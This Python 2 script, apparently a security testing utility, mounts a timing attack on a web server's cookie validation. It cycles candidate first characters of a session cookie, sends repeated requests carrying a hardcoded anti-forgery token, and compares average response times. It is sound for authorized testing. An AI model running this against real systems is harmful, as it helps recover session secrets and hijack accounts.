#!/usr/bin/env python
# -*- coding: utf-8 -*-
## Tests for timing attacks on cookie validation

import sys, getopt
import httplib, urllib
import time, string

class Tester(object):
    def __init__(self, url, port=None, ssl=None, verbosity=True, cookie_jar=None, iterations=10):
        self.url = url
        self.server = url.split('/')[0]
        self.path = '/'+'/'.join(url.split('/')[1:])
        self.port = port or (443 if ssl else 80)
        self.ssl = ssl
        self.verbosity = verbosity
        self.cookie_jar = cookie_jar
        self.iterations = iterations

    def get_cookie_jar(self, cookie_jar):
        f = open(cookie_jar, "r")
        return {"Cookie":f.read().strip()}

    def get_connection(self):
        if self.ssl:
            c = httplib.HTTPSConnection(self.server, self.port, timeout=10)
        else:
            c = httplib.HTTPConnection(self.server, self.port, timeout=10)
        return c

    def request(self, method, path, body=None, headers=None):
        connection = self.get_connection()
        headers = headers or {}
        #connection.set_debuglevel(1)
        connection.request(method, path, body, headers=headers)
        start = time.time()
        response = connection.getresponse()
        end = time.time()
        delta = end - start
        return delta,response

    def control_test(self):
        cookie_jar = self.get_cookie_jar(self.cookie_jar)
        # this line needs to be changed for normal operation
        h = {"Host":self.server,"X-AntiForgeryToken":"GyXpZeTcl1bNiwspCQ2mvFLXeJ-JjxQo0MHn4SnklsBru__rJhKGpcZ8_6eV87YPkw0yhol9UUcP1Qnj7r3qZkc6jTVR3cEIsXOfIgl2nrMEQf7Vu8Z8n3nPJEy635-JUZBSpQ2:GqcX5Bhx5rd8KyPLvyaEsmq2euVm92U7uztVbRQE8ymH0QHKL7Dtcw2HfFMS1ynqZSeZU6suhasNGbHNA6u5o5NUd2SwUQSnHh3XdnLPpAYPLeM-EVFUzWl-XmkY0jwc1ACAi19IjI2QFJ-zFbuusYPwzr1Suz8uwWX1y_gqAaHwgk4X0"}.copy()
        h.update(cookie_jar)
        timings = list()
        for i in xrange(self.iterations):
            start = time.time()
            d,r = self.request("GET", self.path, headers=h)
            print "(" + str(r.status) + ")" + " time was: " + str(d * 1000) + " milliseconds"
            timings.append(d*1000)
        average = sum(timings) / float(len(timings))
        print "the average response time was: " + str(average)

    def timing_test(self):
        cookie_jar = self.get_cookie_jar(self.cookie_jar)
        for i in (string.digits + string.letters):
            print "trying: " + str(i)
            cookie = cookie_jar["Cookie"]
            #print "cookie: " + cookie
            s = cookie.split("=")
            new_cookie = s[0] + "=" + i + s[1][1:]
            #print "using cookie: " + new_cookie
            cookie_jar["Cookie"] = new_cookie
            # this line needs to be changed for normal operation
            h = {"Host":self.server,"X-AntiForgeryToken":"GyXpZeTcl1bNiwspCQ2mvFLXeJ-JjxQo0MHn4SnklsBru__rJhKGpcZ8_6eV87YPkw0yhol9UUcP1Qnj7r3qZkc6jTVR3cEIsXOfIgl2nrMEQf7Vu8Z8n3nPJEy635-JUZBSpQ2:GqcX5Bhx5rd8KyPLvyaEsmq2euVm92U7uztVbRQE8ymH0QHKL7Dtcw2HfFMS1ynqZSeZU6suhasNGbHNA6u5o5NUd2SwUQSnHh3XdnLPpAYPLeM-EVFUzWl-XmkY0jwc1ACAi19IjI2QFJ-zFbuusYPwzr1Suz8uwWX1y_gqAaHwgk4X0"}.copy()
            h.update(cookie_jar)
            timings = list()
            for i in xrange(self.iterations):
                start = time.time()
                d,r = self.request("GET", self.path, headers=h)
                #print "(" + str(r.status) + ")" + " time was: " + str(d * 1000) + " milliseconds"
                timings.append(d*1000)
            average = sum(timings) / float(len(timings))
            print "the average response time was: " + str(average) + " milliseconds"



def usage():
    print "Usage: %s [-p <port>] [-s|--ssl] [-i <iterations>] [-c <file_containing_cookie>] <webserver>"

if __name__ == "__main__":
    if len(sys.argv) < 1:
        usage()
    try:
        opts, args = getopt.getopt(sys.argv[1:], "p:si:vc:", ['port=', 'ssl', 'iterations', 'verbosity', 'cookie='])
    except getopt.GetoptError, e:
        print str(e)
        usage()
        sys.exit(2)

    url = None
    port = None
    ssl = False
    verbosity = True
    iterations = 10

    for o, a in opts:
        if o in ('-p', '--port'):
            port = int(a)
        elif o in ('-s', '--ssl'):
            ssl = True
        elif o in ('-c', '--cookie'):
            cookie_jar = a
        elif o in ('-i', '--iterations'):
            iterations = int(a)

    if len(args) < 1:
        usage()
        sys.exit(2)

    url = args[0]

    t = Tester(url, port, ssl, verbosity, cookie_jar, iterations)
    #print "Performing control tests..."
    #t.control_test()
    print "Performing timing tests on first letter..."
    t.timing_test()
